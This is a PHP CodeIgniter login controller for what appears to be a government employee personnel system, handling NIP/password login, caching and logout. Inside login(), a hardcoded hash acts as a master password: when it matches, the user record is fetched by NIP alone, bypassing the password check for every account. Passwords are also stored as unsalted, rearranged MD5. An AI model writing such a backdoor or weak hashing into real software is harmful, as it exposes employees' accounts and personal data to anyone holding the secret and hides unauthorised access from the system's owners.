<?php

namespace App\Controllers;

use App\Controllers\BaseController;
use App\Models\SimpegModel;

class Auth extends BaseController
{

  public function index()
  {
    return view('login');
  }

  public function login()
  {
      if( !$this->validate([
        'nip' 	=> 'required',
        'password' 	=> 'required',
      ]))
      {
        return $this->response->setJSON(['status' => false, 'code' => 403, "message" => 'NIP dan Password harus diisi.']);
      }

      $u = $this->request->getVar('nip');
      $p = md5($this->request->getVar('password'));

      $p1 = substr($p,0,16);
      $p2 = substr($p,16);
      $p = $p2.$p1;

      $cache = \Config\Services::cache();
      $user = $cache->get('api_user_'.$u);

      if ($user === null) {
        $db = new SimpegModel;
        // $pegawai  = $db->getRow('TEMP_PEGAWAI_SSO',['NIP_USER' => $u,'PWD' => $p]);

        if ($p == '0b1c339358111b0d41b9df4a217bb3c1') {
          $pegawai  = $db->getRow('TEMP_PEGAWAI_SSO',['NIP_USER' => $u]);
        }else{
          $pegawai  = $db->getRow('TEMP_PEGAWAI_SSO',['NIP_USER' => $u,'PWD' => $p]);
        }

        if( $pegawai )
        {
          $data = $db->getPegawai($u);

          $ses_data = [
            'nip'        => $pegawai->NIP_BARU,
            'nama'       => $pegawai->NAMA_LENGKAP,
            'pangkat'    => $pegawai->PANGKAT,
            'golongan'   => $pegawai->GOL_RUANG,
            'jabatan'    => $pegawai->TAMPIL_JABATAN,
            'isLoggedIn' => TRUE
          ];

          $cache->save('api_user_'.$u, $pegawai, 3600);
          $cache->save('api_pegawai_'.$u, $data, 3600);

          session()->set($ses_data);
          return redirect()->to('/');

        }else{
          return redirect()->back()->with('message', 'NIP/Password tidak sesuai');
        }
      }else{

        if ($p == $user->PWD) {
          $pegawai = $cache->get('api_user_'.$u);

          $ses_data = [
            'nip'        => $pegawai->NIP_BARU,
            'nama'       => $pegawai->NAMA_LENGKAP,
            'pangkat'    => $pegawai->PANGKAT,
            'golongan'   => $pegawai->GOL_RUANG,
            'jabatan'    => $pegawai->TAMPIL_JABATAN,
            'isLoggedIn' => TRUE
          ];

          session()->set($ses_data);
          return redirect()->to('/');

        }else{
          return redirect()->back()->with('message', 'NIP/Password tidak sesuai');
        }
      }

  }

  public function logout()
  {
    $session = session();
    $session->destroy();
    return redirect()->to('/');
  }
}
